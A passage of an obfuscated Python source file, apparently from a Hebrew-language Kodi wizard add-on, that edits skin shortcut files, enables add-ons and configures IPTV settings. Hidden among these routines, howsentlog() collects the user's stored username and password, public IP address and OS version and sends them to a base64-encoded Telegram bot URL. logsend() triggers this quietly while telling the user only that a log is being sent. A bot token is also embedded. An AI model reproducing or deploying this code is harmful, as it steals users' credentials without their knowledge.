            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <!-- <include>Object_FlatBackground</include> -->
                    <control type="grouplist" id="3">
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onleft>5</onleft>
                        <onright>5</onright>
                        <width>100%</width>
						<align>right</align>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control>

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
					
                    <control type="grouplist" id="5">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>3</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

            </control>

            <!-- Default Templates -->
            <control type="button" id="7">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="8">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="9">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="11">
                <width>100%</width>
                <height>72</height>
                <texture border="30">common/div.png</texture>
                <include>Defs_OptionButton</include>
            </control>
            <control type="edit" id="12">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="label" id="14">
                <width>100%</width>
                <height>72</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>LineLabel</textcolor>
            </control>
            <control type="sliderex" id="13">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
            <control type="button" id="10">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onleft>3</onleft>
                <onright>3</onright>
                <onup>3</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="28">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="29">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="30">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>
        <control type="label" id="2"><width>1</width><top>-2000</top><height>1</height><visible>false</visible></control>

    </controls>

</window>
''')#line:817
    with open (OOO00O0000O0000O0 ,'w')as OO0O0O0OO0OO0000O :#line:820
      OO0O0O0OO0OO0000O .write (O0OOOOOO0OO00OO0O )#line:821
def testcommand ():#line:822
    telemedia_android5fix ()#line:823
def skin_homeselect ():#line:825
	try :#line:827
		O00O00OOOOOOOO00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:828
		O0OO0OO000O000O00 =open (O00O00OOOOOOOO00O ,'r')#line:830
		OOOOO0OO0OO0OO00O =O0OO0OO000O000O00 .read ()#line:831
		O0OO0OO000O000O00 .close ()#line:832
		OO0O0OOOO0O00000O ='<setting id="HomeS" type="string(.+?)/setting>'#line:833
		O000O00O0O0O0OO00 =re .compile (OO0O0OOOO0O00000O ).findall (OOOOO0OO0OO0OO00O )[0 ]#line:834
		O0OO0OO000O000O00 =open (O00O00OOOOOOOO00O ,'w')#line:835
		O0OO0OO000O000O00 .write (OOOOO0OO0OO0OO00O .replace ('<setting id="HomeS" type="string%s/setting>'%O000O00O0O0O0OO00 ,'<setting id="HomeS" type="string"></setting>'))#line:836
		O0OO0OO000O000O00 .close ()#line:837
	except :#line:838
		pass #line:839
def autotrakt ():#line:842
    OOOO0OO00OO0O00O0 =(ADDON .getSetting ("auto_trk"))#line:843
    if OOOO0OO00OO0O00O0 =='true':#line:844
       from resources .libs import trk_aut #line:845
def traktsync ():#line:847
     O0O0O0OO000OOOO0O =(ADDON .getSetting ("auto_trk"))#line:848
     if O0O0O0OO000OOOO0O =='true':#line:849
       from resources .libs import trk_aut #line:852
     else :#line:853
        ADDON .openSettings ()#line:854
def imdb_synck ():#line:856
   try :#line:857
     O00O0O0OOOOO0OO0O =xbmcaddon .Addon ('plugin.video.exodusredux')#line:858
     O00O0O000OO0OOO00 =xbmcaddon .Addon ('plugin.video.gaia')#line:859
     O00OOOOO0OO0000OO =(ADDON .getSetting ("imdb_sync"))#line:860
     OOO0000O00OO000O0 ="imdb.user"#line:861
     O0000O000O00OOOO0 ="accounts.informants.imdb.user"#line:862
     O00O0O0OOOOO0OO0O .setSetting (OOO0000O00OO000O0 ,str (O00OOOOO0OO0000OO ))#line:863
     O00O0O000OO0OOO00 .setSetting ('accounts.informants.imdb.enabled','true')#line:864
     O00O0O000OO0OOO00 .setSetting (O0000O000O00OOOO0 ,str (O00OOOOO0OO0000OO ))#line:865
   except :pass #line:866
def dis_or_enable_addon (OO0OO000O0O00O0OO ,OOOO00O0O0O00O0OO ,enable ="true"):#line:868
    import json #line:869
    O000O0O0O00OOO00O ='"%s"'%OO0OO000O0O00O0OO #line:870
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OO000O0O00O0OO )and enable =="true":#line:871
        logging .warning ('already Enabled')#line:872
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OO0OO000O0O00O0OO )#line:873
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OO0OO000O0O00O0OO )and enable =="false":#line:874
        return xbmc .log ("### Skipped %s, reason = not installed"%OO0OO000O0O00O0OO )#line:875
    else :#line:876
        O0O000O0OO0OO0O00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O000O0O0O00OOO00O ,enable )#line:877
        OO00OO0O0OO00OO0O =xbmc .executeJSONRPC (O0O000O0OO0OO0O00 )#line:878
        O0OOO00O00O00O00O =json .loads (OO00OO0O0OO00OO0O )#line:879
        if enable =="true":#line:880
            xbmc .log ("### Enabled %s, response = %s"%(OO0OO000O0O00O0OO ,O0OOO00O00O00O00O ))#line:881
        else :#line:882
            xbmc .log ("### Disabled %s, response = %s"%(OO0OO000O0O00O0OO ,O0OOO00O00O00O00O ))#line:883
    if OOOO00O0O0O00O0OO =='auto':#line:884
     return True #line:885
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:886
def iptvset ():#line:889
  try :#line:890
    OOOO000O000OO0000 =(ADDON .getSetting ("iptv_on"))#line:891
    if OOOO000O000OO0000 =='true':#line:893
       if KODIV >=17 and KODIV <18 :#line:895
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:896
         O0OOOOOOO0O000000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:897
         O0O0O0O00O000O000 =(ADDON .getSetting ("iptvUrl"))#line:899
         O0OOOOOOO0O000000 .setSetting ('m3uUrl',O0O0O0O00O000O000 )#line:900
         O00OO0O00OO00O00O =(ADDON .getSetting ("epg_Url"))#line:901
         O0OOOOOOO0O000000 .setSetting ('epgUrl',O00OO0O00OO00O00O )#line:902
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:905
         iptvsimpldownpc ()#line:906
         wiz .kodi17Fix ()#line:907
         xbmc .sleep (1000 )#line:908
         O0OOOOOOO0O000000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:909
         O0O0O0O00O000O000 =(ADDON .getSetting ("iptvUrl"))#line:910
         O0OOOOOOO0O000000 .setSetting ('m3uUrl',O0O0O0O00O000O000 )#line:911
         O00OO0O00OO00O00O =(ADDON .getSetting ("epg_Url"))#line:912
         O0OOOOOOO0O000000 .setSetting ('epgUrl',O00OO0O00OO00O00O )#line:913
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:915
         iptvsimpldown ()#line:916
         wiz .kodi17Fix ()#line:917
         xbmc .sleep (1000 )#line:918
         O0OOOOOOO0O000000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:919
         O0O0O0O00O000O000 =(ADDON .getSetting ("iptvUrl"))#line:920
         O0OOOOOOO0O000000 .setSetting ('m3uUrl',O0O0O0O00O000O000 )#line:921
         O00OO0O00OO00O00O =(ADDON .getSetting ("epg_Url"))#line:922
         O0OOOOOOO0O000000 .setSetting ('epgUrl',O00OO0O00OO00O00O )#line:923
  except :pass #line:924
def howsentlog ():#line:931
       try :#line:933
          import json #line:934
          O0OO0OO0OOO00OO0O =(ADDON .getSetting ("user"))#line:935
          OO0OOOO0O0000OO00 =(ADDON .getSetting ("pass"))#line:936
          OOO0OOO000OOOO0OO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:937
          O00OO00O0O000O0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:939
          OOOOOO000O0000OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:940
          OO000OOOO0OOO0OO0 =str (json .loads (OOOOOO000O0000OO0 )['ip'])#line:941
          O00OO00000O000OOO =O0OO0OO0OOO00OO0O #line:942
          OO00000OO0000000O =OO0OOOO0O0000OO00 #line:943
          xbmc .getInfoLabel ('System.OSVersionInfo')#line:944
          xbmc .sleep (1500 )#line:945
          O00000000O00OOOOO =xbmc .getInfoLabel ('System.OSVersionInfo')#line:946
          import socket #line:948
          OOOOOO000O0000OO0 =urllib2 .urlopen (O00OO00O0O000O0OO .decode ('base64')+' מערכת הפעלה: '+O00000000O00OOOOO +' שם משתמש: '+O00OO00000O000OOO +' סיסמה: '+OO00000OO0000000O +' קודי: '+OOO0OOO000OOOO0OO +' כתובת: '+OO000OOOO0OOO0OO0 ).readlines ()#line:949
       except :pass #line:951
def googleindicat ():#line:954
			import logg #line:955
			OOO0OO0OOO0O0O000 =(ADDON .getSetting ("pass"))#line:956
			OO0OO00OO00OOO0O0 =(ADDON .getSetting ("user"))#line:957
			logg .logGA (OOO0OO0OOO0O0O000 ,OO0OO00OO00OOO0O0 )#line:958
def logsend ():#line:959
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]שולח לוג אנא המתן[/COLOR]'%COLOR2 )#line:960
      OOOOO0OOO0OOOOO0O =xbmcgui .DialogBusy ()#line:961
      OOOOO0OOO0OOOOO0O .create ()#line:962
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:963
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:964
      howsentlog ()#line:966
      import requests #line:967
      if xbmc .getCondVisibility ('system.platform.windows'):#line:968
         OOOO00O0O00O00OO0 =xbmc .translatePath ('special://home/kodi.log')#line:969
         OO0OO00O0O0O0O0OO ={'chat_id':(None ,'-274262389'),'document':(OOOO00O0O00O00OO0 ,open (OOOO00O0O00O00OO0 ,'rb')),}#line:973
         OOO0O000OO000O0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:974
         O000O0OOOO0O0OOO0 =requests .post (OOO0O000OO000O0OO .decode ('base64'),files =OO0OO00O0O0O0O0OO )#line:976
      elif xbmc .getCondVisibility ('system.platform.android'):#line:977
           OOOO00O0O00O00OO0 =xbmc .translatePath ('special://temp/kodi.log')#line:978
           OO0OO00O0O0O0O0OO ={'chat_id':(None ,'-274262389'),'document':(OOOO00O0O00O00OO0 ,open (OOOO00O0O00O00OO0 ,'rb')),}#line:982
           OOO0O000OO000O0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:983
           O000O0OOOO0O0OOO0 =requests .post (OOO0O000OO000O0OO .decode ('base64'),files =OO0OO00O0O0O0O0OO )#line:985
      else :#line:986
           OOOO00O0O00O00OO0 =xbmc .translatePath ('special://kodi.log')#line:987
           OO0OO00O0O0O0O0OO ={'chat_id':(None ,'-274262389'),'document':(OOOO00O0O00O00OO0 ,open (OOOO00O0O00O00OO0 ,'rb')),}#line:991
           OOO0O000OO000O0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:992
           O000O0OOOO0O0OOO0 =requests .post (OOO0O000OO000O0OO .decode ('base64'),files =OO0OO00O0O0O0O0OO )#line:994
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:995
def rdoff ():#line:997
	OO000000O0OO00O0O =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:1028
	O00O00O0OOO00O000 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1029
	copyfile (OO000000O0OO00O0O ,O00O00O0OOO00O000 )#line:1030
def skindialogsettind18 ():#line:1031
	try :#line:1032
		OOOOO0O0OO0OOOOO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:1033
		OO0OO00000OOO0O00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:1034
		copyfile (OOOOO0O0OO0OOOOO0 ,OO0OO00000OOO0O00 )#line:1035
	except :pass #line:1036
def rdon ():#line:1037
	loginit .loginIt ('restore','all')#line:1038
	OOO000OOO00OOO000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1040
	OOO0OO0O00OO0000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1041
	copyfile (OOO000OOO00OOO000 ,OOO0OO0O00OO0000O )#line:1042
def adults18 ():#line:1044
  O00O0000000OO000O =(ADDON .getSetting ("adults"))#line:1045
  if O00O0000000OO000O =='true':#line:1046
    O0O00OOOO00OO0OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1047
    with open (O0O00OOOO00OO0OOO ,'r')as OOO00OOOOO00OO0O0 :#line:1048
      OOOO0000000O0O0O0 =OOO00OOOOO00OO0O0 .read ()#line:1049
    OOOO0000000O0O0O0 =OOOO0000000O0O0O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1067
    with open (O0O00OOOO00OO0OOO ,'w')as OOO00OOOOO00OO0O0 :#line:1070
      OOO00OOOOO00OO0O0 .write (OOOO0000000O0O0O0 )#line:1071
def rdbuildaddon ():#line:1072
  OOO00OOO0O000O0O0 =(ADDON .getSetting ("auto_rd"))#line:1073
  if OOO00OOO0O000O0O0 =='true':#line:1074
    OOO0000000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1075
    with open (OOO0000000O0O00O0 ,'r')as O00OOOOO0OOOOOO0O :#line:1076
      O00O00000OOO00O0O =O00OOOOO0OOOOOO0O .read ()#line:1077
    O00O00000OOO00O0O =O00O00000OOO00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1095
    with open (OOO0000000O0O00O0 ,'w')as O00OOOOO0OOOOOO0O :#line:1098
      O00OOOOO0OOOOOO0O .write (O00O00000OOO00O0O )#line:1099
    OOO0000000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1103
    with open (OOO0000000O0O00O0 ,'r')as O00OOOOO0OOOOOO0O :#line:1104
      O00O00000OOO00O0O =O00OOOOO0OOOOOO0O .read ()#line:1105
    O00O00000OOO00O0O =O00O00000OOO00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1123
    with open (OOO0000000O0O00O0 ,'w')as O00OOOOO0OOOOOO0O :#line:1126
      O00OOOOO0OOOOOO0O .write (O00O00000OOO00O0O )#line:1127
    OOO0000000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1131
    with open (OOO0000000O0O00O0 ,'r')as O00OOOOO0OOOOOO0O :#line:1132
      O00O00000OOO00O0O =O00OOOOO0OOOOOO0O .read ()#line:1133
    O00O00000OOO00O0O =O00O00000OOO00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1151
    with open (OOO0000000O0O00O0 ,'w')as O00OOOOO0OOOOOO0O :#line:1154
      O00OOOOO0OOOOOO0O .write (O00O00000OOO00O0O )#line:1155
    OOO0000000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1159
    with open (OOO0000000O0O00O0 ,'r')as O00OOOOO0OOOOOO0O :#line:1160
      O00O00000OOO00O0O =O00OOOOO0OOOOOO0O .read ()#line:1161
    O00O00000OOO00O0O =O00O00000OOO00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1179
    with open (OOO0000000O0O00O0 ,'w')as O00OOOOO0OOOOOO0O :#line:1182
      O00OOOOO0OOOOOO0O .write (O00O00000OOO00O0O )#line:1183
    OOO0000000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1186
    with open (OOO0000000O0O00O0 ,'r')as O00OOOOO0OOOOOO0O :#line:1187
      O00O00000OOO00O0O =O00OOOOO0OOOOOO0O .read ()#line:1188
    O00O00000OOO00O0O =O00O00000OOO00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1206
    with open (OOO0000000O0O00O0 ,'w')as O00OOOOO0OOOOOO0O :#line:1209
      O00OOOOO0OOOOOO0O .write (O00O00000OOO00O0O )#line:1210
    OOO0000000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1212
    with open (OOO0000000O0O00O0 ,'r')as O00OOOOO0OOOOOO0O :#line:1213
      O00O00000OOO00O0O =O00OOOOO0OOOOOO0O .read ()#line:1214
    O00O00000OOO00O0O =O00O00000OOO00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1232
    with open (OOO0000000O0O00O0 ,'w')as O00OOOOO0OOOOOO0O :#line:1235
      O00OOOOO0OOOOOO0O .write (O00O00000OOO00O0O )#line:1236
    OOO0000000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1238
    with open (OOO0000000O0O00O0 ,'r')as O00OOOOO0OOOOOO0O :#line:1239
      O00O00000OOO00O0O =O00OOOOO0OOOOOO0O .read ()#line:1240
    O00O00000OOO00O0O =O00O00000OOO00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1258
    with open (OOO0000000O0O00O0 ,'w')as O00OOOOO0OOOOOO0O :#line:1261
      O00OOOOO0OOOOOO0O .write (O00O00000OOO00O0O )#line:1262
    OOO0000000O0O00O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1265
    with open (OOO0000000O0O00O0 ,'r')as O00OOOOO0OOOOOO0O :#line:1266
      O00O00000OOO00O0O =O00OOOOO0OOOOOO0O .read ()#line:1267
    O00O00000OOO00O0O =O00O00000OOO00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1285
    with open (OOO0000000O0O00O0 ,'w')as O00OOOOO0OOOOOO0O :#line:1288
      O00OOOOO0OOOOOO0O .write (O00O00000OOO00O0O )#line:1289
def rdbuildinstall ():#line:1292
  try :#line:1293
   O0O00O00OOOO0OOO0 =(ADDON .getSetting ("auto_rd"))#line:1294
   if O0O00O00OOOO0OOO0 =='true':#line:1295
     O0O0O000O0OO0OOO0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1296
     OO0OO0000OO00O00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1297
     copyfile (O0O0O000O0OO0OOO0 ,OO0OO0000OO00O00O )#line:1298
  except :#line:1299
     pass #line:1300
def rdbuildaddonoff ():#line:1303
    O0O0000O0O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1306
    with open (O0O0000O0O0O00OOO ,'r')as OO0OOOOOO0OOOO00O :#line:1307
      O00O000OO00O00O0O =OO0OOOOOO0OOOO00O .read ()#line:1308
    O00O000OO00O00O0O =O00O000OO00O00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1326
    with open (O0O0000O0O0O00OOO ,'w')as OO0OOOOOO0OOOO00O :#line:1329
      OO0OOOOOO0OOOO00O .write (O00O000OO00O00O0O )#line:1330
    O0O0000O0O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1334
    with open (O0O0000O0O0O00OOO ,'r')as OO0OOOOOO0OOOO00O :#line:1335
      O00O000OO00O00O0O =OO0OOOOOO0OOOO00O .read ()#line:1336
    O00O000OO00O00O0O =O00O000OO00O00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1354
    with open (O0O0000O0O0O00OOO ,'w')as OO0OOOOOO0OOOO00O :#line:1357
      OO0OOOOOO0OOOO00O .write (O00O000OO00O00O0O )#line:1358
    O0O0000O0O0O00OOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1362
